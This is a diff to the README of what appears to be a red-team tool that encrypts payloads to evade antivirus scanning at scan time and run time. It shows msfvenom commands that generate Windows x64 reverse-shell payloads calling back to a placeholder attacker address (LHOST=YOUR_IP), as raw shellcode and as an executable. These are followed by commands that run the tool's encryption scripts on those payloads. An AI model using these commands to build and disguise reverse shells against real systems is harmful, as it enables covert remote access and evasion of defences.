@@ -21,12 +21,12 @@ This tool is ideal for red teamers, penetration testers, or researchers who want
 ### 1. Generate your payload
 
 - For runtime:
-  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f raw -o shellcode.bin`
+  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f raw -o payload.bin`
 
 - For scantime:
   `msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o payload.exe`
 
 ### 2. Encrypt your payload
 
-- Scantime: `python3 scantime.py payload.exe`
-- Runtime: `python3 runtime.py shellcode.bin`
+- `python3 scantime/runtime.py payload.exe/.bin`
+
